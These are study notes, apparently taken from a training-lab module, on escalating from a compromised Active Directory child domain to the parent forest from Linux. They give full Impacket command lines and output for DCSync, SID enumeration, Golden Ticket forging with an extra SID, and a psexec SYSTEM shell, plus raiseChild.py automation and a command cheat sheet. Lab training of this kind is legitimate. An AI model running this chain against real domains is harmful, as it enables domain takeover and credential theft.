![Image](https://images.openai.com/static-rsc-4/fc8vxIk3PpJ9JsUnivZXSFaZMeGL_bBbdqcKKU_qgMidXsZpGfsALoTrTzZCU1lnPID9Lm1GlJJ0_WwTd3YEww3yLZS0lkblXUBlQTxPqtOfrzABxD8YPHB9I6okv9dyt6khwBcAbxmDHJrIzbA-tehXIi3SNOI21It9fe8toLPaDOYnEcNY7vBSVfLXZ9iQ?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/ODfVYVS8wWpE5JA38cuSfcHPDQWZ8a7BB93xNTmLp93TE-52-UtybAhYzGPC-N-oTSC8SbK4eSympuR2sUF3ao-QGg07wga54SV0y8tAnzpRkrcCrCJtaDM0GyqGbMQyYcqHuUxDOjSdLuvYQdFDLIV-Z2QShbrKZ6Om1QjxRcB-7LicEAVbewe584iinSGm?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/kYViIW-RMNMr2p8KoTVlIJ1XQTAdL9t4TRhmbvgllGwr-VZWGX3yk3z0V361ng9k-MPPKmwvfXLuzQozh1SIjtcuLq0ZCXEfo-IVitPKnEaDBQ8QUIDGJ_5RWBtU4p9L6LbpoL5a0_uxCBFoa1_8vn9BBaLc68gLP80H9E13Lp-7ymkYjarCBQ2nUvKv580q?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/wItR74Pd5mS7INZE5DiG4sXtuD2neIBwp7KGCTklxcJbW6HLasjV7neRH3UxMiiap6XngirtfwkDgf4IXqoIdEw8i9oROywhRD9vtRxFAEQ8bAQ6GgCGtq6UMbf0O0bJRlJxwJ318Q0edXW-Lnoq6Y4SwtbI9eLW7F5Hiuq55LSYkP6d-oMojcLajIK9qO4k?purpose=fullsize)

# 1. Overview

The **Child → Parent Trust** attack can also be performed from a **Linux attack host**.

The overall goal is to leverage control of a child domain to gain access to the **parent/root domain**.

In this module, the child domain is:

```text
LOGISTICS.INLANEFREIGHT.LOCAL
```

The forest/root domain is:

```text
INLANEFREIGHT.LOCAL
```

The Linux-based approach uses **Impacket** tools instead of performing the entire attack from a Windows host.

---

# 2. Information Required

Before constructing the attack, we need to gather the same important pieces of information.

The module identifies these five requirements:

### 1. KRBTGT hash for the child domain

```text
9d765b482771505cbe97411065964d5f
```

### 2. SID for the child domain

```text
S-1-5-21-2806153819-209893948-922872689
```

### 3. Name of a target user in the child domain

The user **does not need to exist**.

The module uses:

```text
hacker
```

### 4. FQDN of the child domain

```text
LOGISTICS.INLANEFREIGHT.LOCAL
```

### 5. SID of the Enterprise Admins group of the root domain

```text
S-1-5-21-3842939050-3880317879-2865463114-519
```

These five values are the foundation of the attack.

---

# 3. Attack Overview

The Linux attack can be represented as:

```text
              Parent / Root Domain
              INLANEFREIGHT.LOCAL
                       ▲
                       │
             Enterprise Admins SID
                       │
                       │ Extra SID
                       │
                Golden Ticket
                       │
                       │
              Child KRBTGT Hash
                       │
                       ▼
           LOGISTICS.INLANEFREIGHT.LOCAL
                       │
                       ▼
              Compromised Child
```

The important concept is that the Golden Ticket is created for the **child domain**, while the **Enterprise Admins SID from the root domain** is added as an Extra SID.

---

# 4. DCSync from Linux

Once we have complete control of the child domain, we can use:

```text
secretsdump.py
```

from the **Impacket** toolkit to perform a DCSync operation and retrieve the NTLM hash of the child-domain `KRBTGT` account.

## Command

```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

The important part is:

```text
-just-dc-user LOGISTICS/krbtgt
```

This tells `secretsdump.py` to target the `krbtgt` account rather than dumping all domain credentials.

---

# 5. Understanding the DCSync Output

Relevant output:

```text
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
```

The structure is:

```text
username : RID : LM hash : NT hash
```

Therefore:

```text
Username:
krbtgt

RID:
502

NT hash:
9d765b482771505cbe97411065964d5f
```

The command also retrieves Kerberos keys:

```text
aes256-cts-hmac-sha1-96:
d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8

aes128-cts-hmac-sha1-96:
ca289e175c372cebd18083983f88c03e

des-cbc-md5:
fee04c3d026d7538
```

The module's output confirms that `secretsdump.py` uses the **DRSUAPI method** to retrieve NTDS secrets.

---

# 6. Finding the Child Domain SID

The next requirement is the child-domain SID.

The module uses:

```text
lookupsid.py
```

from Impacket.

This performs SID brute forcing against the Domain Controller.

## Command

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```

The output identifies:

```text
Domain SID is:
S-1-5-21-2806153819-209893948-922872689
```

---

# 7. Understanding Domain SID + RID

A complete account SID is constructed from:

```text
DOMAIN_SID-RID
```

For example, the module shows:

```text
Domain SID:
S-1-5-21-2806153819-209893948-922872689
```

The `lab_adm` user has RID:

```text
1001
```

Therefore its full SID is:

```text
S-1-5-21-2806153819-209893948-922872689-1001
```

This relationship is important when interpreting SID enumeration results.

---

# 8. Filtering the Output

The complete `lookupsid.py` output contains a lot of information.

Instead of reading everything, we can filter for the domain SID:

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

Result:

```text
[*] Domain SID is:
S-1-5-21-2806153819-209893948-922872689
```

This is a useful Linux habit:

```text
Tool output
     ↓
grep
     ↓
Relevant information
```

---

# 9. Finding the Root Domain SID

Next, the module targets the **INLANEFREIGHT Domain Controller**.

The purpose is to obtain the root domain SID.

The root domain SID is:

```text
S-1-5-21-3842939050-3880317879-2865463114
```

The Enterprise Admins group has RID:

```text
519
```

Therefore:

```text
Root Domain SID:
S-1-5-21-3842939050-3880317879-2865463114

Enterprise Admins RID:
519
```

Combine them:

```text
S-1-5-21-3842939050-3880317879-2865463114-519
```

This is the **Enterprise Admins SID** used by the attack.

---

# 10. Finding Enterprise Admins with lookupsid.py

The module uses:

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

Relevant output:

```text
[*] Domain SID is:
S-1-5-21-3842939050-3880317879-2865463114

519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```

Therefore:

```text
Enterprise Admins SID =
Root Domain SID + 519
```

Result:

```text
S-1-5-21-3842939050-3880317879-2865463114-519
```

---

# 11. Attack Data — Final Collection

At this point, we have everything needed.

|Item|Value|
|---|---|
|Child KRBTGT hash|`9d765b482771505cbe97411065964d5f`|
|Child domain SID|`S-1-5-21-2806153819-209893948-922872689`|
|Target user|`hacker`|
|Child domain FQDN|`LOGISTICS.INLANEFREIGHT.LOCAL`|
|Enterprise Admins SID|`S-1-5-21-3842939050-3880317879-2865463114-519`|

The module explicitly lists these values before constructing the Golden Ticket.

---

# 12. Golden Ticket with ticketer.py

On Linux, we use:

```text
ticketer.py
```

from the Impacket toolkit.

The module explains that the generated ticket can be valid for accessing resources in:

```text
Child domain
```

and:

```text
Parent domain
```

The child domain is specified using:

```text
-domain-sid
```

and the parent-domain Enterprise Admins SID is supplied through:

```text
-extra-sid
```

---

# 13. Constructing the Golden Ticket

Command from the module:

```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

### Important parameters

```text
-nthash
```

The child-domain KRBTGT NT hash.

```text
-domain
```

The child-domain FQDN.

```text
-domain-sid
```

The child-domain SID.

```text
-extra-sid
```

The Enterprise Admins SID from the root domain.

```text
hacker
```

The target username.

The module specifically notes that `hacker` is a **non-existent user** used for the forged ticket.

---

# 14. What ticketer.py Does

The output shows several stages:

```text
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in hacker.ccache
```

The important result is:

```text
hacker.ccache
```

---

# 15. Kerberos Credential Cache — ccache

Linux Kerberos tools can use a **credential cache (ccache)** file to store Kerberos credentials.

The generated ticket is saved as:

```text
hacker.ccache
```

The module explains that we can tell Kerberos which credential cache to use by setting:

```text
KRB5CCNAME
```

---

# 16. Setting KRB5CCNAME

Command:

```bash
export KRB5CCNAME=hacker.ccache
```

This makes the generated ticket available to Kerberos authentication attempts from the current Linux shell.

Conceptually:

```text
hacker.ccache
      |
      v
 KRB5CCNAME
      |
      v
Kerberos-aware tools
      |
      v
Authentication
```

---

# 17. Using the Ticket with psexec.py

The module uses Impacket's:

```text
psexec.py
```

to authenticate to the parent Domain Controller.

Command:

```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

Important options:

```text
-k
```

Use Kerberos authentication.

```text
-no-pass
```

Do not ask for a password.

```text
-target-ip
```

Specify the target IP address.

The Kerberos credential comes from the previously configured ccache.

---

# 18. Result — SYSTEM Shell

The successful output shows:

```text
[*] Requesting shares on 172.16.5.5.....
[*] Found writable share ADMIN$
[*] Uploading file nkYjGWDZ.exe
[*] Opening SVCManager on 172.16.5.5.....
[*] Creating service eTCU on 172.16.5.5.....
[*] Starting service eTCU.....
```

Then:

```text
C:\Windows\system32> whoami
nt authority\system
```

And:

```text
C:\Windows\system32> hostname
ACADEMY-EA-DC01
```

Therefore, the forged ticket successfully allowed authentication to the parent Domain Controller and execution as SYSTEM in the lab.

---

# 19. Automated Method — raiseChild.py

Impacket also provides:

```text
raiseChild.py
```

This automates the child → parent escalation process.

Instead of manually collecting every value and creating the Golden Ticket, `raiseChild.py` performs the workflow automatically.

The module states that it requires:

- Target Domain Controller
    
- Administrative credentials for the child domain
    

It then performs the remaining steps.

---

# 20. raiseChild.py Command

Example:

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

The tool identifies:

```text
Child domain:
LOGISTICS.INLANEFREIGHT.LOCAL
```

and:

```text
Forest:
INLANEFREIGHT.LOCAL
```

It then obtains the Enterprise Admin SID:

```text
S-1-5-21-3842939050-3880317879-2865463114-519
```

---

# 21. raiseChild.py Workflow

The module shows that the tool performs these operations:

```text
1. Find child-domain information
          ↓
2. Find forest FQDN
          ↓
3. Obtain Enterprise Admins SID
          ↓
4. Retrieve child KRBTGT credentials
          ↓
5. Create Golden Ticket
          ↓
6. Authenticate to forest
          ↓
7. Retrieve target-user credentials
          ↓
8. Optionally launch PSEXEC
```

The tool can retrieve credentials for the parent-domain `krbtgt` and `administrator` accounts.

---

# 22. raiseChild.py Output

The example shows:

```text
[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
```

Then:

```text
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is:
S-1-5-21-3842939050-3880317879-2865463114-519
```

Then it obtains child-domain credentials:

```text
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt
```

and parent-domain credentials.

The tool ultimately opens a PSEXEC shell on:

```text
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

where:

```text
whoami
```

returns:

```text
nt authority\system
```

---

# 23. raiseChild.py Internal Workflow

The module provides the workflow in the script comments.

## Input

### 1. Child-domain administrator credentials

Can be supplied as:

```text
domain/username[:password]
```

The domain must be the **domain FQDN**.

### 2. Optional Golden Ticket output path

Using:

```text
-w
```

### 3. Optional target-user RID

Using:

```text
-targetRID
```

Administrator is the default.

### 4. Optional PSEXEC target

Using:

```text
-target-exec
```

Enterprise Admin is the default privilege level for the target execution.

---

# 24. raiseChild.py Processing

The module describes the process as:

```text
1. Find child Domain Controller
2. Find forest FQDN
3. Get forest Enterprise Admin SID
4. Get child KRBTGT credentials
5. Create Golden Ticket with Enterprise Admin SID in ExtraSids
6. Use ticket to log into the forest
7. Retrieve target-user information
8. Save ticket as ccache if requested
9. Launch PSEXEC if requested
```

---

# 25. Output of raiseChild.py

Possible outputs include:

```text
1. Target-user credentials
2. Golden Ticket saved in ccache format
3. PSEXEC shell with target-user privileges
```

The module notes that Enterprise Admin privileges are the default for the `target-exec` functionality.

---

# 26. Manual vs Automated Attack

There are two approaches.

## Manual

```text
secretsdump.py
      ↓
lookupsid.py
      ↓
ticketer.py
      ↓
KRB5CCNAME
      ↓
psexec.py
```

### Advantages

- Understand every step.
    
- Easier troubleshooting.
    
- Know exactly what information is being used.
    
- Greater control over the attack chain.
    

---

## Automated

```text
raiseChild.py
      ↓
Child → Parent escalation
```

### Advantage

It saves time by automating the individual steps.

---

# 27. Important Lesson — Understand the Manual Process

The module specifically emphasizes that although tools such as:

```text
raiseChild.py
```

can save time, it is important to understand the underlying process.

If the automated tool fails, understanding the manual workflow makes it easier to identify:

```text
What information is missing?
What step failed?
What authentication failed?
What SID is incorrect?
What ticket is invalid?
```

The module recommends understanding the tools rather than blindly relying on an **"autopwn"** script.

---

# 28. Full Linux Attack Chain

Memorize this:

```text
                 CHILD DOMAIN
                      |
                      v
             Compromise child
                      |
                      v
              secretsdump.py
                      |
                      v
             Child KRBTGT hash
                      |
                      v
               lookupsid.py
                      |
             +--------+--------+
             |                 |
             v                 v
       Child Domain SID    Root Domain SID
                               |
                               v
                      Enterprise Admins
                               |
                               v
                        Enterprise Admin SID
                               |
                               +--------+
                                        |
                                        v
                                  ticketer.py
                                        |
                                        v
                                 Golden Ticket
                                        |
                                        v
                                  hacker.ccache
                                        |
                                        v
                                KRB5CCNAME
                                        |
                                        v
                                  psexec.py
                                        |
                                        v
                             Parent Domain DC
                                        |
                                        v
                                SYSTEM ACCESS
```

---

# 29. Tool Cheat Sheet

|Tool|Purpose|
|---|---|
|`secretsdump.py`|DCSync / retrieve KRBTGT credentials|
|`lookupsid.py`|Enumerate SIDs|
|`ticketer.py`|Create Golden Ticket|
|`psexec.py`|Authenticate and obtain a remote shell|
|`raiseChild.py`|Automate child → parent escalation|

---

# 30. Command Cheat Sheet

### DCSync

```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

### Child SID

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

### Root Enterprise Admins SID

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

### Golden Ticket

```bash
ticketer.py -nthash <KRBTGT_HASH> -domain <CHILD_DOMAIN> -domain-sid <CHILD_SID> -extra-sid <ENTERPRISE_ADMINS_SID> hacker
```

### Set Kerberos cache

```bash
export KRB5CCNAME=hacker.ccache
```

### Use Kerberos ticket

```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

### Automated

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

---

# 31. Important Values from the Module

```text
Child Domain:
LOGISTICS.INLANEFREIGHT.LOCAL

Root Domain:
INLANEFREIGHT.LOCAL

Child Domain SID:
S-1-5-21-2806153819-209893948-922872689

Root Domain SID:
S-1-5-21-3842939050-3880317879-2865463114

Enterprise Admins RID:
519

Enterprise Admins SID:
S-1-5-21-3842939050-3880317879-2865463114-519

Child KRBTGT NTLM:
9d765b482771505cbe97411065964d5f

Target User:
hacker

Ticket:
hacker.ccache
```

---

# 32. What You Should Memorize for HTB

### Concept 1

```text
Child domain → Parent domain
```

The attack starts after gaining sufficient control of the child.

### Concept 2

```text
KRBTGT hash
```

Needed to construct the Golden Ticket.

### Concept 3

```text
Child Domain SID
```

Used with `-domain-sid`.

### Concept 4

```text
Enterprise Admins SID
```

Used with `-extra-sid`.

### Concept 5

```text
ccache
```

Linux stores the generated Kerberos ticket here.

### Concept 6

```text
KRB5CCNAME
```

Tells Kerberos-aware tools which credential cache to use.

### Concept 7

```text
psexec.py
```

Can be used to authenticate to the target and obtain a shell in the lab.

### Concept 8

```text
raiseChild.py
```

Automates the entire child → parent workflow.

---

# 33. Manual Attack — One-Line Mental Model

```text
DCSync → SID enumeration → Golden Ticket → Extra SID → ccache → Kerberos → Parent DC
```

If you remember only one line from this module, remember that.

---

# 34. Cross-Forest Trusts — Next Topic

The module ends by introducing **cross-forest trust abuse**.

This concerns environments where there is a:

```text
Bidirectional Forest Trust
```

A bidirectional forest trust can allow authentication into another forest.

The module notes that cross-forest trust attacks are covered in greater detail in later modules.

---

# Final Summary

The Linux version of the **Child → Parent Trust attack** follows this structure:

```text
1. Obtain child KRBTGT hash
          ↓
2. Obtain child domain SID
          ↓
3. Obtain root-domain Enterprise Admins SID
          ↓
4. Create Golden Ticket with ticketer.py
          ↓
5. Add Enterprise Admins SID using -extra-sid
          ↓
6. Save ticket as hacker.ccache
          ↓
7. Set KRB5CCNAME
          ↓
8. Authenticate with Kerberos
          ↓
9. Access parent-domain resources
```

The most important distinction from the Windows version is the **tooling**:

```text
Windows:
Mimikatz → Pass-the-Ticket

Linux:
secretsdump.py → lookupsid.py → ticketer.py → ccache → psexec.py
```

And the automated Linux alternative is:

```text
raiseChild.py
```

The core concept remains the same: **use control of the child domain and its KRBTGT secret to construct a Golden Ticket containing the parent domain's Enterprise Admins SID.**

The module also explicitly warns against blindly relying on automated “autopwn” tooling: understanding the individual steps makes troubleshooting and controlled testing much easier.